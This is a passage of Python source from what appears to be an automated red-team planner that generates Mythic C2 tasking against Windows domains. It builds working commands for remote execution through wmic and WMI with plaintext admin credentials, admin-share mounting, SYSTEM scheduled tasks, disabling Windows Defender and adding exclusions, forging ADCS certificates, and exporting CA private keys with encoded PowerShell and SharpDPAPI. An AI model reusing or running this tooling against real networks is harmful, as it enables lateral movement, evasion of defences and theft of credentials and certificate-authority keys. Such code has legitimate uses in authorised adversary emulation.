                    produces=["remote_process_created", "remote_execution_proof"],
                ),
            ]
            if revert:
                commands.append(
                    MythicCapabilityCommand(
                        command=revert,
                        parameters={},
                        capability=capability,
                        purpose="revert from the local-admin sacrificial logon context",
                        expected_probe="",
                        prerequisites=[],
                        consumes=["local_admin_logon_context"],
                        produces=[],
                    )
                )
            return commands
        if runner_is_shell:
            wmic_parameters: Any = " ".join([
                "wmic.exe",
                f"/node:{host}",
                "process",
                "call",
                "create",
                _windows_arg(remote_command),
            ])
            proof_parameters: Any = " ".join([
                "ping", "-n", wait_count, "127.0.0.1", ">NUL",
                "&&", "type", _cmd_quote(proof_unc),
            ])
        else:
            wmic_parameters = {
                exe_param: "wmic.exe",
                args_param: " ".join([
                    f"/node:{host}",
                    "process",
                    "call",
                    "create",
                    _windows_arg(remote_command),
                ]),
            }
            proof_parameters = {
                exe_param: "cmd.exe",
                args_param: " ".join([
                    "/c",
                    "ping", "-n", wait_count, "127.0.0.1", ">NUL",
                    "&&", "type", proof_unc,
                ]),
            }
        commands = [
            MythicCapabilityCommand(
                command=make_token,
                parameters=_make_token_parameters(config, principal, local_account, realm, password),
                capability=capability,
                purpose="create a sacrificial network logon context for the selected local-admin credential",
                expected_probe="",
                prerequisites=prerequisites,
                produces=["local_admin_logon_context"],
            ),
            MythicCapabilityCommand(
                command=runner,
                parameters=wmic_parameters,
                capability=capability,
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe=_text(getattr(step, "expected_probe", "")),
                prerequisites=prerequisites,
                consumes=["local_admin_logon_context"],
                produces=["remote_process_created"],
            ),
            MythicCapabilityCommand(
                command=runner,
                parameters=proof_parameters,
                capability=capability,
                purpose=f"read target-side proof file from {proof_unc} under the local-admin logon context",
                expected_probe="extract_remote_execution_probe",
                prerequisites=prerequisites,
                consumes=["local_admin_logon_context", "remote_process_created"],
                produces=["remote_execution_proof"],
            ),
        ]
        if revert:
            commands.append(
                MythicCapabilityCommand(
                    command=revert,
                    parameters={},
                    capability=capability,
                    purpose="revert from the local-admin sacrificial logon context",
                    expected_probe="",
                    prerequisites=[],
                    consumes=["local_admin_logon_context"],
                    produces=[],
                )
            )
        return commands
    context_reset_commands = _explicit_credential_run_reset_commands(step, config)
    if method in {"powershell-wmi", "powershell_wmi", "ps-wmi", "ps_wmi"}:
        powershell = _native_windows_remote_exec_powershell(
            host=host,
            share_host=share_host,
            principal=principal,
            password=password,
            remote_command=remote_command,
            proof_marker=proof_marker,
            proof_path=proof_path,
            wait_seconds=_adapter_text(config, "native_remote_exec_wait_seconds", "6") or "6",
        )
        return [
            *context_reset_commands,
            MythicCapabilityCommand(
                command=command,
                parameters={
                    exe_param: "powershell.exe",
                    args_param: _powershell_encoded_args(powershell),
                },
                capability=capability,
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe="extract_remote_execution_probe",
                prerequisites=prerequisites,
                produces=["remote_process_created", "remote_execution_proof"],
            )
        ]
    return [
        *context_reset_commands,
        MythicCapabilityCommand(
            command=command,
            parameters={
                exe_param: "cmdkey.exe",
                args_param: " ".join([
                    f"/add:{share_host}",
                    f"/user:{principal}",
                    f"/pass:{password}",
                ]),
            },
            capability=capability,
            purpose="stage the selected local-admin credential for target network authentication",
            expected_probe="",
            prerequisites=prerequisites,
            produces=["target_credential_cached"],
        ),
        MythicCapabilityCommand(
            command=command,
            parameters={
                exe_param: "net.exe",
                args_param: " ".join([
                    "use",
                    share,
                    "/persistent:no",
                ]),
            },
            capability=capability,
            purpose="authenticate to the target admin share with the staged local-admin credential",
            expected_probe="",
            prerequisites=prerequisites,
            consumes=["target_credential_cached"],
            produces=["admin_share_authenticated"],
        ),
        MythicCapabilityCommand(
            command=command,
            parameters={
                exe_param: "wmic.exe",
                args_param: " ".join([
                    f"/node:{host}",
                    f"/user:{principal}",
                    f"/password:{password}",
                    "process",
                    "call",
                    "create",
                    _windows_arg(remote_command),
                ]),
            },
            capability=capability,
            purpose=_text(getattr(step, "purpose", "")),
            expected_probe=_text(getattr(step, "expected_probe", "")),
            prerequisites=prerequisites,
            consumes=["target_credential_cached"],
            produces=["remote_process_created"],
        ),
        MythicCapabilityCommand(
            command=command,
            parameters={
                exe_param: "cmd.exe",
                args_param: " ".join([
                    "/c",
                    "ping", "-n", wait_count, "127.0.0.1", ">NUL",
                    "&&", "type", proof_unc,
                ]),
            },
            capability=capability,
            purpose=f"read target-side proof file from {proof_unc}",
            expected_probe="extract_remote_execution_probe",
            prerequisites=prerequisites,
            consumes=["admin_share_authenticated", "remote_process_created"],
            produces=["remote_execution_proof"],
        ),
    ]


def _explicit_credential_run_reset_commands(
    step: Any,
    config: dict[str, Any],
) -> list[MythicCapabilityCommand]:
    context_reset_command = _adapter_text(config, "explicit_credential_remote_exec_reset_command", "")
    if not context_reset_command:
        return []
    return [
        MythicCapabilityCommand(
            command=context_reset_command,
            parameters={},
            capability=_text(getattr(step, "capability", "")),
            purpose="clear any stored impersonation token before explicit-credential child-process remote execution",
            expected_probe="",
            prerequisites=[],
        )
    ]


def _native_windows_remote_exec_powershell(
    *,
    host: str,
    share_host: str,
    principal: str,
    password: str,
    remote_command: str,
    proof_marker: str,
    proof_path: str,
    wait_seconds: str,
) -> str:
    drive_path = _psdrive_path("SAGEPROOF", proof_path)
    share_root = f"\\\\{share_host}\\C$"
    return ";".join([
        "$ErrorActionPreference='Stop'",
        f"$sec=ConvertTo-SecureString {_ps_quote(password)} -AsPlainText -Force",
        f"$cred=New-Object System.Management.Automation.PSCredential({_ps_quote(principal)},$sec)",
        f"$cmd={_ps_quote(remote_command)}",
        (
            "Invoke-WmiMethod -Class Win32_Process -Name Create "
            f"-ComputerName {_ps_quote(host)} -Credential $cred -ArgumentList $cmd | Out-String | Write-Output"
        ),
        f"Start-Sleep -Seconds {wait_seconds}",
        (
            "New-PSDrive -Name SAGEPROOF -PSProvider FileSystem "
            f"-Root {_ps_quote(share_root)} -Credential $cred | Out-Null"
        ),
        f"Get-Content -LiteralPath {_ps_quote(drive_path)}",
    ])


def _psdrive_path(drive: str, path: str) -> str:
    cleaned = path.strip().strip('"').replace("/", "\\")
    if len(cleaned) >= 2 and cleaned[1] == ":":
        cleaned = cleaned[2:]
    return f"{drive}:" + "\\" + cleaned.lstrip("\\")


def _native_windows_remote_exec_shell(parameters: dict[str, Any], config: dict[str, Any]) -> str:
    target_host = _short_host(parameters.get("target_host"))
    target_domain = _normalize(parameters.get("target_domain"))
    local_account = _text(parameters.get("local_account") or parameters.get("username") or "Administrator")
    password = _text(parameters.get("password"))
    proof_marker = _text(parameters.get("proof_marker"))
    proof_path = _text(parameters.get("proof_path") or r"C:\Windows\Temp\sage_remote_exec.txt")
    if not target_host or not local_account or not password or not proof_marker or not proof_path:
        return ""
    host = _host_fqdn(target_host, target_domain)
    share_host = _adapter_text(config, "native_remote_exec_share_host", target_host) or target_host
    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    share = f"\\\\{share_host}\\C$"
    proof_unc = _unc_from_windows_path(share_host, proof_path)
    remote_command = _text(parameters.get("command") or parameters.get("remote_command")) or _native_windows_probe_command(proof_marker, proof_path)
    wait_count = _adapter_text(config, "native_remote_exec_wait_ping_count", "6") or "6"
    method = _normalize(config.get("native_remote_exec_method") or parameters.get("method") or "wmic")
    if method in {"wmiexec", "wmiexecute"}:
        method = "wmic"
    if method not in {"wmic", "native-wmic", "native_wmic"}:
        return ""
    return " ".join([
        "cmd.exe", "/c",
        "net", "use", _cmd_quote(share), f"/user:{_cmd_quote(principal)}", _cmd_quote(password), "/persistent:no",
        "&&", "wmic", f"/node:{_cmd_quote(host)}", f"/user:{_cmd_quote(principal)}", f"/password:{_cmd_quote(password)}",
        "process", "call", "create", _cmd_quote(remote_command),
        "&&", "ping", "-n", wait_count, "127.0.0.1", ">NUL",
        "&&", "type", _cmd_quote(proof_unc),
    ])


def _native_windows_probe_command(proof_marker: str, proof_path: str) -> str:
    path = proof_path.strip('"')
    return " ".join([
        "cmd.exe", "/c",
        "echo", proof_marker, ">", path,
        "&", "whoami", ">>", path,
        "&", "hostname", ">>", path,
    ])


def _unc_from_windows_path(host: str, path: str) -> str:
    cleaned = path.strip().strip('"').replace("/", "\\")
    if cleaned.startswith("\\\\"):
        return cleaned
    drive = "C"
    rest = cleaned
    if len(cleaned) >= 2 and cleaned[1] == ":":
        drive = cleaned[0].upper()
        rest = cleaned[2:]
    rest = rest.lstrip("\\")
    return f"\\\\{host}\\{drive}$\\{rest}"


def _make_token_parameters(
    config: dict[str, Any],
    principal: str,
    account: str,
    realm: str,
    password: str,
) -> dict[str, Any]:
    if _input_bool(config, "make_token_use_credential_object", default=False):
        credential_param = _adapter_text(config, "make_token_credential_param", "Credential")
        netonly_param = _adapter_text(config, "make_token_netonly_param", "netOnly")
        return {
            credential_param: {
                "account": account,
                "credential": password,
                "realm": realm,
                "type": _adapter_text(config, "make_token_credential_type", "plaintext"),
            },
            netonly_param: _input_bool(config, "make_token_netonly", default=True),
        }
    return {
        _adapter_text(config, "make_token_user_param", "user"): principal,
        _adapter_text(config, "make_token_pass_param", "pass"): password,
    }


def _native_windows_scheduled_task_command(
    *,
    host: str,
    task_name: str,
    remote_command: str,
    proof_unc: str,
    wait_count: str,
) -> str:
    return " ".join([
        "schtasks.exe",
        "/Create",
        "/S",
        host,
        "/RU",
        "SYSTEM",
        "/SC",
        "ONCE",
        "/ST",
        "23:59",
        "/TN",
        _cmd_quote(task_name),
        "/TR",
        _cmd_quote(remote_command),
        "/F",
        "&",
        "schtasks.exe",
        "/Run",
        "/S",
        host,
        "/TN",
        _cmd_quote(task_name),
        "&",
        "ping",
        "-n",
        wait_count,
        "127.0.0.1",
        ">NUL",
        "&",
        "schtasks.exe",
        "/Delete",
        "/S",
        host,
        "/TN",
        _cmd_quote(task_name),
        "/F",
        "&",
        "type",
        _cmd_quote(proof_unc),
    ])


def _scheduled_task_name(proof_marker: str) -> str:
    cleaned = "".join(ch for ch in _text(proof_marker) if ch.isalnum())
    suffix = cleaned[-18:] if cleaned else "RemoteExec"
    return f"SageExec_{suffix}"


def _remote_file_read_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    if _input_bool(config, "suppress_remote_file_read", default=False):
        return MythicCapabilityCommandPlan(True, commands=[], reason="remote proof read is handled by the execution adapter")
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    path = _text(parameters.get("path") or parameters.get("proof_unc") or parameters.get("proof_resource"))
    if not path:
        return MythicCapabilityCommandPlan(
            False,
            missing=["path"],
            reason="remote file read adapter needs a proof path",
        )

    command = _adapter_text(config, "remote_file_read_command", _adapter_text(config, "file_read_command", "cat"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["remote_file_read_command"],
            reason="remote file read adapter needs a Mythic command",
        )
    path_param = _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path"))
    commands = [
        _command_from_step(
            step,
            command,
            {path_param: path},
            consumes=["remote_process_created"],
            produces=["remote_execution_proof"],
            deferred="{{" in path,
        ),
    ]
    commands.extend(_local_admin_cleanup_commands(step, config))
    return MythicCapabilityCommandPlan(True, commands=commands)


def _local_admin_cleanup_commands(step: Any, config: dict[str, Any]) -> list[MythicCapabilityCommand]:
    cleanup_command = _adapter_text(config, "local_admin_remote_exec_cleanup_command", "")
    if not cleanup_command:
        return []
    return [
        MythicCapabilityCommand(
            command=cleanup_command,
            parameters={},
            capability=_text(getattr(step, "capability", "")),
            purpose="revert from the local-admin network logon context after proof readback",
            expected_probe="",
            operation="local-admin-logon-session-revert",
            prerequisites=[],
            consumes=["local_admin_logon_context"],
            produces=[],
        )
    ]


def _endpoint_protection_adjustment_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    host = _host_fqdn(target_host, target_domain)
    provider = _normalize(parameters.get("provider") or "windows-defender")
    method = _normalize(parameters.get("method") or "local")
    local_account = _text(parameters.get("local_account") or parameters.get("username") or "Administrator")
    password = _text(
        parameters.get("password")
        or parameters.get("local_admin_password")
        or parameters.get("managed_local_admin_secret")
        or parameters.get("secret")
        or parameters.get("credential")
    )
    proof_marker = _text(parameters.get("proof_marker") or "SAGE_EP_ADJUST_PROOF")
    output_path = _text(parameters.get("output_path") or r"C:\Windows\Temp\sage_ep_adjust.txt")
    wait_seconds = _text(parameters.get("wait_seconds") or "10")
    actions = _string_list(parameters.get("actions")) or ["disable_realtime", "add_exclusion"]
    exclusion_paths = _string_list(parameters.get("exclusion_paths")) or [r"C:\Windows\Temp"]
    missing = []
    if provider not in {"windows-defender", "defender", "microsoft-defender"}:
        missing.append("provider")
    if not host:
        missing.append("target_host")
    if method in {"remote-wmi", "wmi", "remote"} and not password:
        missing.append("password")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="endpoint protection adapter needs target host/domain and password for remote WMI",
        )

    command = _adapter_text(config, "endpoint_control_command", _adapter_text(config, "powershell_command", "powerpick"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["endpoint_control_command"],
            reason="endpoint protection adapter needs a Mythic PowerShell command",
        )
    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    script = _endpoint_protection_powershell(
        host=host,
        share_host=_adapter_text(config, "endpoint_control_share_host", target_host) or target_host,
        principal=principal,
        password=password,
        proof_marker=proof_marker,
        output_path=output_path,
        wait_seconds=wait_seconds,
        actions=actions,
        exclusion_paths=exclusion_paths,
        remote=method in {"remote-wmi", "wmi", "remote"},
    )
    normalized_command = _normalize(command)
    if normalized_command == "run":
        mythic_parameters: Any = {
            _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
            _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(script),
        }
        commands = (
            _explicit_credential_run_reset_commands(step, config)
            if method in {"remote-wmi", "wmi", "remote"} else []
        )
        commands.append(_command_from_step(step, command, mythic_parameters, produces=["endpoint_protection_probe"]))
        return MythicCapabilityCommandPlan(True, commands=commands)
    elif normalized_command == "shell":
        mythic_parameters = {
            _adapter_text(config, "shell_arguments_param", "arguments"): "powershell.exe " + _powershell_encoded_args(script),
        }
    elif _input_bool(config, "endpoint_control_raw_script", default=True):
        mythic_parameters = script
    else:
        mythic_parameters = {_adapter_text(config, "endpoint_control_script_param", "script"): script}
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, mythic_parameters, produces=["endpoint_protection_probe"]),
    ])


def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    ca_pfx_path = _text(parameters.get("ca_pfx_path") or parameters.get("ca_cert_path") or parameters.get("ca_certificate_path"))
    ca_pfx_password = _text(
        parameters.get("ca_pfx_password")
        or parameters.get("ca_cert_password")
        or parameters.get("ca_certificate_password")
    )
    subject = _text(parameters.get("subject") or parameters.get("certificate_subject"))
    subject_alt_name = _text(parameters.get("subject_alt_name") or parameters.get("san") or parameters.get("upn"))
    account_sid = _text(parameters.get("account_sid") or parameters.get("target_sid") or parameters.get("principal_sid"))
    crl_distribution_points = _string_list(
        parameters.get("crl_distribution_points")
        or parameters.get("crl_distribution_point")
        or parameters.get("crl")
    )
    forged_pfx_path = _text(
        parameters.get("forged_pfx_path")
        or parameters.get("forged_certificate_path")
        or parameters.get("new_cert_path")
        or parameters.get("certificate_path")
    )
    forged_pfx_password = _text(
        parameters.get("forged_pfx_password")
        or parameters.get("forged_certificate_password")
        or parameters.get("new_cert_password")
        or parameters.get("certificate_password")
    )
    missing = []
    if not ca_pfx_path:
        missing.append("ca_pfx_path")
    if not subject and not _input_bool(config, "certificate_forge_omit_subject", default=False):
        missing.append("subject")
    if not subject_alt_name:
        missing.append("subject_alt_name")
    if not forged_pfx_path:
        missing.append("forged_pfx_path")
    if not forged_pfx_password:
        missing.append("forged_pfx_password")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="ADCS certificate forge adapter needs CA PFX, subject/SAN, and output PFX path/password",
        )

    tool_name = _adapter_text(config, "certificate_forge_tool", _adapter_text(config, "adcs_certificate_forge_tool", "Certify.exe"))
    backend = _normalize(config.get("certificate_forge_backend") or config.get("adcs_certificate_forge_backend"))
    if not backend:
        backend = "forgecert" if "forgecert" in _normalize(tool_name) else "certify"
    if backend in {"forgecert", "forge-cert"}:
        pieces = [
            "--CaCertPath", _quote_cli(ca_pfx_path),
            "--CaCertPassword", _quote_cli(ca_pfx_password),
            "--Subject", _quote_cli(subject),
            "--SubjectAltName", _quote_cli(subject_alt_name),
            "--NewCertPath", _quote_cli(forged_pfx_path),
            "--NewCertPassword", _quote_cli(forged_pfx_password),
        ]
    else:
        pieces = [
            "forge",
            "--ca-cert", _quote_cli(ca_pfx_path),
            "--ca-pass", _quote_cli(ca_pfx_password),
            "--upn", _quote_cli(subject_alt_name),
        ]
        if subject and not _input_bool(config, "certificate_forge_omit_subject", default=False):
            pieces.extend(["--subject", _quote_cli(subject)])
        if account_sid:
            pieces.extend(["--sid", _quote_cli(account_sid)])
        if crl_distribution_points and not _input_bool(config, "certificate_forge_omit_crl", default=False):
            pieces.extend(["--crl", _quote_cli(crl_distribution_points[0])])
        pieces.extend([
            "--output-path", _quote_cli(forged_pfx_path),
            "--output-pass", _quote_cli(forged_pfx_password),
        ])
    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
    if not command.ok:
        return command
    return _plan_with_terminal_artifacts(command, produces=["forged_certificate_pfx"])


def _adcs_esc_certificate_enroll_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _normalize(parameters.get("domain") or parameters.get("target_domain") or parameters.get("realm"))
    account = _normalize(parameters.get("account") or parameters.get("user") or parameters.get("principal") or "administrator")
    ca_name = _text(parameters.get("ca_name") or parameters.get("certificate_authority") or parameters.get("ca"))
    template = _text(parameters.get("template") or parameters.get("certificate_template") or parameters.get("adcs_template"))
    subject = _text(parameters.get("subject") or parameters.get("certificate_subject") or f"CN={account}")
    subject_alt_name = _text(parameters.get("subject_alt_name") or parameters.get("san") or parameters.get("upn") or f"{account}@{domain}")
    certificate_path = _text(
        parameters.get("certificate_path")
        or parameters.get("forged_pfx_path")
        or parameters.get("forged_certificate_path")
        or parameters.get("new_cert_path")
    )
    certificate_password = _text(
        parameters.get("certificate_password")
        or parameters.get("forged_pfx_password")
        or parameters.get("forged_certificate_password")
        or parameters.get("new_cert_password")
    )
    proof_marker = _text(parameters.get("proof_marker") or parameters.get("enroll_marker"))
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not ca_name:
        missing.append("ca_name")
    if not template:
        missing.append("template")
    if not certificate_path:
        missing.append("certificate_path")
    if not certificate_password:
        missing.append("certificate_password")
    if not proof_marker:
        missing.append("proof_marker")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="ADCS ESC enrollment adapter needs domain/account, CA, template, PFX path/password, and marker",
        )

    script = _adcs_esc_certificate_enroll_powershell(
        domain=domain,
        account=account,
        ca_name=ca_name,
        template=template,
        subject=subject,
        subject_alt_name=subject_alt_name,
        certificate_path=certificate_path,
        certificate_password=certificate_password,
        proof_marker=proof_marker,
        esc_type=_normalize(parameters.get("esc_type") or parameters.get("adcs_esc") or "esc1"),
    )
    command = _adapter_text(config, "adcs_enroll_command", _adapter_text(config, "powershell_command", "powerpick"))
    if not command:
        return MythicCapabilityCommandPlan(False, missing=["adcs_enroll_command"], reason="no ADCS enrollment command")
    normalized_command = _normalize(command)
    if normalized_command == "run":
        mythic_parameters: Any = {
            _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
            _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(script),
        }
    elif normalized_command == "shell":
        mythic_parameters = {
            _adapter_text(config, "shell_arguments_param", "arguments"): "powershell.exe " + _powershell_encoded_args(script),
        }
    elif _input_bool(config, "adcs_enroll_raw_script", default=True):
        mythic_parameters = script
    else:
        mythic_parameters = {_adapter_text(config, "adcs_enroll_script_param", "script"): script}
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, mythic_parameters, produces=["enrolled_certificate_material"]),
    ])


def _adcs_ca_private_key_export_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    host = _host_fqdn(target_host, target_domain)
    local_account = _text(
        parameters.get("local_account")
        or parameters.get("local_user")
        or parameters.get("username")
        or parameters.get("user")
        or "Administrator"
    )
    password = _text(
        parameters.get("password")
        or parameters.get("local_admin_password")
        or parameters.get("managed_local_admin_secret")
        or parameters.get("secret")
        or parameters.get("credential")
    )
    proof_marker = _text(parameters.get("proof_marker") or parameters.get("export_marker"))
    pfx_path = _text(parameters.get("pfx_path") or parameters.get("remote_pfx_path"))
    metadata_path = _text(parameters.get("metadata_path") or parameters.get("meta_path") or parameters.get("remote_metadata_path"))
    pfx_password = _text(parameters.get("pfx_password") or parameters.get("certificate_password"))
    export_method = _normalize(
        parameters.get("adcs_ca_export_method")
        or parameters.get("ca_export_method")
        or parameters.get("export_method")
        or "certutil-backupkey"
    )
    missing = []
    if not host:
        missing.append("target_host")
    if not local_account:
        missing.append("local_account")
    if not password:
        missing.append("password")
    if not proof_marker:
        missing.append("proof_marker")
    if not pfx_path:
        missing.append("pfx_path")
    if not metadata_path:
        missing.append("metadata_path")
    if not pfx_password:
        missing.append("pfx_password")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="ADCS CA private-key export adapter needs target, credential, marker, PFX path, metadata path, and PFX password",
        )

    use_current_context = _input_bool(
        parameters,
        "use_current_context",
        default=_input_bool(config, "adcs_ca_export_use_current_context", default=False),
    )
    default_command = (
        _adapter_text(config, "current_context_powershell_command", "powerpick")
        if use_current_context
        else _adapter_text(
            config,
            "local_admin_remote_exec_command",
            _adapter_text(config, "remote_exec_command", "wmiexecute"),
        )
    )
    command = _adapter_text(config, "adcs_ca_export_command", default_command)
    if not command:
        return MythicCapabilityCommandPlan(False, missing=["adcs_ca_export_command"], reason="no ADCS CA export command")

    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    share_host = _adapter_text(config, "native_remote_exec_share_host", target_host) or target_host
    powershell = _adcs_ca_export_powershell(
        host=host,
        share_host=share_host,
        principal=principal,
        password=password,
        use_current_context=use_current_context,
        proof_marker=proof_marker,
        pfx_path=pfx_path,
        metadata_path=metadata_path,
        pfx_password=pfx_password,
        wait_seconds=_text(parameters.get("wait_seconds") or config.get("adcs_ca_export_wait_seconds") or "8"),
        export_method=export_method,
    )
    normalized_command = _normalize(command)
    capability = _text(getattr(step, "capability", ""))
    prerequisites = list(getattr(step, "prerequisites", []) or [])
    if normalized_command in {"wmiexec", "wmiexecute"}:
        remote_script = _adcs_ca_export_remote_script(
            export_method=export_method,
            proof_marker=proof_marker,
            pfx_path=pfx_path,
            metadata_path=metadata_path,
            pfx_password=pfx_password,
        )
        encoded = base64.b64encode(remote_script.encode("utf-16le")).decode("ascii")
        remote_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encoded
        metadata_unc = _unc_from_windows_path(host, metadata_path)
        if _input_bool(
            config,
            "adcs_ca_export_use_token_context",
            default=_input_bool(config, "local_admin_remote_exec_use_token_context", default=False),
        ):
            token_plan = _local_admin_token_wmiexecute_commands(
                step,
                config,
                parameters,
                command,
                host,
                local_account,
                password,
                remote_command,
                expected_probe="",
                purpose=f"launch ADCS CA private-key export on {target_host}@{target_domain}",
            )
            if not token_plan.ok:
                return token_plan
            commands = list(token_plan.commands)
            commands.append(
                MythicCapabilityCommand(
                    command=_adapter_text(config, "remote_file_read_command", _adapter_text(config, "file_read_command", "cat")),
                    parameters={
                        _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path")): metadata_unc,
                    },
                    capability=capability,
                    purpose=f"read ADCS CA export metadata and PFX material from {metadata_unc}",
                    expected_probe="extract_adcs_ca_private_key_probe",
                    prerequisites=prerequisites,
                    consumes=["local_admin_logon_context", "remote_process_created"],
                    produces=["adcs_ca_private_key_material"],
                )
            )
            commands.extend(_local_admin_cleanup_commands(step, config))
            return MythicCapabilityCommandPlan(True, commands=commands)
        return MythicCapabilityCommandPlan(True, commands=[
            MythicCapabilityCommand(
                command=command,
                parameters={
                    _adapter_text(config, "remote_exec_command_param", "command"): remote_command,
                    _adapter_text(config, "remote_exec_host_param", "host"): host,
                    _adapter_text(config, "remote_exec_username_param", "username"): local_account,
                    _adapter_text(config, "remote_exec_password_param", "password"): password,
                    _adapter_text(config, "remote_exec_domain_param", "domain"): realm,
                },
                capability=capability,
                purpose=f"launch ADCS CA private-key export on {target_host}@{target_domain}",
                expected_probe="",
                prerequisites=prerequisites,
                produces=["remote_process_created"],
            ),
            MythicCapabilityCommand(
                command=_adapter_text(config, "remote_file_read_command", _adapter_text(config, "file_read_command", "cat")),
                parameters={
                    _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path")): metadata_unc,
                },
                capability=capability,
                purpose=f"read ADCS CA export metadata and PFX material from {metadata_unc}",
                expected_probe="extract_adcs_ca_private_key_probe",
                prerequisites=prerequisites,
                consumes=["remote_process_created"],
                produces=["adcs_ca_private_key_material"],
            ),
        ])
    if normalized_command == "run":
        commands = [] if use_current_context else _explicit_credential_run_reset_commands(step, config)
        commands.append(
            MythicCapabilityCommand(
                command=command,
                parameters={
                    _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
                    _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(powershell),
                },
                capability=capability,
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe="extract_adcs_ca_private_key_probe",
                prerequisites=prerequisites,
                produces=["adcs_ca_private_key_material"],
            )
        )
        return MythicCapabilityCommandPlan(True, commands=commands)
    if normalized_command == "shell":
        shell_param = _adapter_text(config, "shell_arguments_param", "arguments")
        return MythicCapabilityCommandPlan(True, commands=[
            MythicCapabilityCommand(
                command=command,
                parameters={shell_param: "powershell.exe " + _powershell_encoded_args(powershell)},
                capability=capability,
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe="extract_adcs_ca_private_key_probe",
                prerequisites=prerequisites,
                produces=["adcs_ca_private_key_material"],
            )
        ])

    raw_script = _input_bool(config, "adcs_ca_export_raw_script", default=True)
    if raw_script:
        mythic_parameters: Any = powershell
    else:
        mythic_parameters = {_adapter_text(config, "adcs_ca_export_script_param", "script"): powershell}
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            produces=["adcs_ca_private_key_material"],
        ),
    ])


def _adcs_ca_private_key_dpapi_export_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    host = _host_fqdn(target_host, target_domain)
    local_account = _text(
        parameters.get("local_account")
        or parameters.get("local_user")
        or parameters.get("username")
        or parameters.get("user")
        or "Administrator"
    )
    password = _text(
        parameters.get("password")
        or parameters.get("local_admin_password")
        or parameters.get("managed_local_admin_secret")
        or parameters.get("secret")
        or parameters.get("credential")
    )
    proof_marker = _text(parameters.get("proof_marker") or parameters.get("export_marker"))
    tool_name = _text(parameters.get("tool") or parameters.get("dpapi_tool") or "SharpDPAPI.exe")
    tool_file_uuid = _text(parameters.get("tool_file_uuid") or parameters.get("dpapi_tool_file_uuid") or parameters.get("file_uuid"))
    staged_tool_path = _text(parameters.get("staged_tool_path") or parameters.get("tool_path"))
    output_path = _text(parameters.get("output_path") or parameters.get("remote_output_path"))
    missing = []
    if not host:
        missing.append("target_host")
    if not local_account:
        missing.append("local_account")
    if not password:
        missing.append("password")
    if not proof_marker:
        missing.append("proof_marker")
    if not tool_name:
        missing.append("tool")
    if _input_bool(config, "adcs_ca_include_tool_upload", default=True) and not tool_file_uuid:
        missing.append("tool_file_uuid")
    if not staged_tool_path:
        missing.append("staged_tool_path")
    if not output_path:
        missing.append("output_path")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="SharpDPAPI ADCS export adapter needs target, credential, marker, tool, staged path, and output path",
        )

    command = _adapter_text(
        config,
        "adcs_ca_export_command",
        _adapter_text(config, "local_admin_remote_exec_command", "run"),
    )
    if not command:
